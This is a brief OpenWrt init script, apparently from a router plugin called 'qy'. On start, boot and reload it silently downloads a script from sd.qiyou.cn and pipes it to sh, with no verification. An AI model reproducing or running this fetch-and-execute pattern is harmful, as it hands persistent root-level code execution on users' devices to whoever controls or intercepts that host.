# qyfiles/etc/init.d/qy
#!/bin/sh /etc/rc.common

START=99


start() {
    curl -s sd.qiyou.cn | sh
}

boot() {
    start
}

reload() {
    start
}